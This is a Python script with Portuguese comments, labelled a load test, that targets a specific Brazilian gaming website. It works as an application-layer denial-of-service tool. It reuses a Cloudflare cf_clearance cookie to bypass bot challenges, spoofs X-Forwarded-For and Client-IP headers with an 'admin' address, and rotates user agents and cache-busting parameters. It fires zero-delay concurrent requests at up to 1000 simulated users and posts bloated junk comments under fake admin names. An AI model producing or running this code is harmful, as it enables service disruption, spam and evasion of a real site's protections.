# -*- coding: utf-8 -*-
"""
Teste de Carga de Exaustão de Recursos com Bypass de Cloudflare (cf_clearance):
- Injeta o cookie cf_clearance para autenticar sessões e evitar telas de Managed Challenge.
- Envia payloads pesados de dados (body bloat) para esgotar a memória do servidor no parsing.
- Concorrência máxima sem pausas (Zero-Delay) para forçar o limite de conexões simultâneas.
"""

from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import statistics
import string
import threading
import time
import requests
from requests.adapters import HTTPAdapter

# ---------------- Configuração ----------------
HOST = "https://www.tokyogamesrgh.com.br"
IP_ADMIN = "170.244.203.38" 

# COLE AQUI O SEU COOKIE CF_CLEARANCE OBTIDO APÓS RESOLVER O DESAFIO NO NAVEGADOR:
CF_CLEARANCE_COOKIE = "COLE_SEU_COOKIE_CF_CLEARANCE_AQUI"

MAX_JOGO_ID = 50
RODADAS = [100, 250, 500, 1000]
TIMEOUT = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

TERMOS_BUSCA = ["GTA V", "Minecraft", "FIFA", "Naruto", "Call of Duty", "God of War", "Need for Speed", "Resident Evil"]

trava_print = threading.Lock()

def log(msg: str) -> None:
    with trava_print:
        print(msg)


class RelatorioMetricas:
    def __init__(self):
        self.ok = 0
        self.erro = 0
        self.status_codes = {}
        self.tempos = []
        self.lock = threading.Lock()

    def registrar(self, sucesso: bool, tempo: float, status_code=None):
        with self.lock:
            if sucesso:
                self.ok += 1
            else:
                self.erro += 1
            
            status_key = status_code if status_code is not None else 'TIMEOUT_EXC'
            self.status_codes[status_key] = self.status_codes.get(status_key, 0) + 1
            self.tempos.append(tempo)


def criar_sessao_otimizada() -> requests.Session:
    s = requests.Session()
    adapter = HTTPAdapter(pool_connections=300, pool_maxsize=300, max_retries=0)
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    
    s.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "X-Forwarded-For": IP_ADMIN,
        "Client-IP": IP_ADMIN
    })
    
    # Injeta o cookie de liberação do Cloudflare se ele tiver sido configurado
    if CF_CLEARANCE_COOKIE and CF_CLEARANCE_COOKIE != "COLE_SEU_COOKIE_CF_CLEARANCE_AQUI":
        s.cookies.set("cf_clearance", CF_CLEARANCE_COOKIE, domain="www.tokyogamesrgh.com.br")
        
    return s


def requisitar_extremo(session: requests.Session, metodo: str, caminho: str, data=None):
    separador = "&" if "?" in caminho else "?"
    url = f"{HOST}{caminho}{separador}_cb={random.randint(10000000, 99999999)}"

    t0 = time.time()
    try:
        r = session.request(metodo, url, data=data, timeout=TIMEOUT)
        dt = time.time() - t0
        sucesso = r.status_code < 500
        return sucesso, dt, r.status_code
    except requests.exceptions.RequestException:
        return False, time.time() - t0, None


def cenario_exaustao_servidor(metricas: RelatorioMetricas):
    """Executa requisições pesadas sem pausas para esgotar recursos."""
    with criar_sessao_otimizada() as session:
        # 1. Busca aleatória complexa
        termo = random.choice(TERMOS_BUSCA)
        sucesso, dt, status = requisitar_extremo(session, "GET", f"/busca?q={termo.replace(' ', '+')}")
        metricas.registrar(sucesso, dt, status)

        # 2. Acesso a item e download simulado
        jogo_id = random.randint(1, MAX_JOGO_ID)
        sucesso, dt, status = requisitar_extremo(session, "GET", f"/jogo/{jogo_id}")
        metricas.registrar(sucesso, dt, status)

        # 3. Payload Gigante (Força o servidor a alocar memória RAM para ler os dados)
        lixo_memoria = "".join(random.choices(string.ascii_letters + string.digits, k=4000))
        dados_pesados = {
            "comentario": lixo_memoria,
            "autor": f"admin_stress_{random.randint(1000,9999)}"
        }
        sucesso, dt, status = requisitar_extremo(session, "POST", f"/jogo/{jogo_id}/comentar", data=dados_pesados)
        metricas.registrar(sucesso, dt, status)


def executar_rodada_carga(n_usuarios: int):
    metricas = RelatorioMetricas()
    t0 = time.time()
    
    with ThreadPoolExecutor(max_workers=min(n_usuarios, 150)) as executor:
        futures = [executor.submit(cenario_exaustao_servidor, metricas) for _ in range(n_usuarios)]
        for future in as_completed(futures):
            future.result()
            
    duracao = time.time() - t0
    total = metricas.ok + metricas.erro
    rps = total / duracao if duracao > 0 else 0
    
    tempos = sorted(metricas.tempos)
    media = sum(tempos) / len(tempos) if tempos else 0
    p95 = tempos[int(len(tempos) * 0.95)] if tempos else 0
    p99 = tempos[int(len(tempos) * 0.99)] if tempos else 0
    pior = max(tempos) if tempos else 0

    log(f"\n==================================================")
    log(f"🔥 RODADA EXTREMA: {n_usuarios} CONCORRENTES")
    log(f"==================================================")
    log(f"  • Total de Requisições: {total}")
    log(f"  • Sucessos: {metricas.ok} | Erros/Bloqueios: {metricas.erro}")
    log(f"  • Vazão: {rps:.2f} req/s | Duração: {duracao:.2f}s")
    log(f"  • Latência Média: {media:.3f}s | P95: {p95:.3f}s | P99: {p99:.3f}s | Pior: {pior:.3f}s")
    log(f"  • Status HTTP: {metricas.status_codes}")


def main():
    log("==================================================")
    log(f"🌐 IP DE ADMINISTRADOR CONFIGURADO: {IP_ADMIN}")
    log(f"🚀 INICIANDO TESTE DE EXAUSTÃO EM {HOST}")
    log("==================================================")
    
    for n in RODADAS:
        executar_rodada_carga(n)
        time.sleep(1)


if __name__ == "__main__":
    main()
